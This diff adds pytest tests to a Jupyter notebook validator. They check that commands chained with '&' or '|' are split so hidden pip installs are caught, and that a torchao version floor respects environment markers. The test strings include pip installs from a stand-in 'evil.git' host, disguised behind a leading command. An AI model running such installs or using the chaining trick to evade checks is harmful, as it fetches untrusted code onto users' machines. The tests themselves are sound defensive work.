@@ -1476,6 +1476,53 @@ def test_install_cell_discovery_finds_compound_commands():
         assert nv.install_cells(_one_cell_notebook(source)) == [], source
 
 
+def test_notebook_validator_splits_on_single_control_operators():
+    """`A & B` backgrounds A and runs B, `A | B` runs both. Neither opened a command boundary,
+    so a line starting with something other than pip hid the install entirely."""
+    nv = _load_notebook_validator_module()
+
+    assert [c for c, _ in nv._split_chained("!sleep 1 & pip install x")] == [
+        "!sleep 1",
+        "!pip install x",
+    ]
+    assert [c for c, _ in nv._split_chained("!echo x | pip install y")] == [
+        "!echo x",
+        "!pip install y",
+    ]
+
+    for evil in (
+        "!sleep 1 & pip install git+https://example.com/evil.git",
+        "!echo x | pip install git+https://example.com/evil.git",
+    ):
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
+        ), evil
+
+    # A redirection is not a separator, and neither is a quoted ampersand.
+    assert [c for c, _ in nv._split_chained("!pip install foo > log 2>&1")] == [
+        "!pip install foo > log 2>&1"
+    ]
+    assert nv._split_chained('!pip install "a&b"')[0][0] == '!pip install "a&b"'
+
+
+def test_torchao_floor_ignores_a_requirement_pip_skips():
+    """R-INST-003 reads the floor from the same cell, so a requirement whose marker is false
+    must not satisfy it either."""
+    nv = _load_notebook_validator_module()
+
+    colab = {"peft": "0.20.0", "torchao": "0.10.0"}
+    assert [f.rule for f in nv.rule_inst_003_peft_torchao(
+        '!pip install "torchao>=0.16.0; python_version < \'3.10\'"', colab, "nb.ipynb", 0
+    )] == ["R-INST-003"]
+
+    # A marker that holds, and no marker at all, both still clear the floor.
+    for cell in (
+        '!pip install "torchao>=0.16.0; python_version >= \'3.10\'"',
+        '!pip install "torchao>=0.16.0"',
+    ):
+        assert nv.rule_inst_003_peft_torchao(cell, colab, "nb.ipynb", 0) == [], cell
+
+
 def test_notebook_validator_reads_a_range_as_one_window():
     """A `>=X,<Y` pair is the same constraint as `~=X`, and the guard's own remedy is
     spelled that way (`pip install 'torchcodec>=0.11,<0.12.0'`), so the rule has to read it
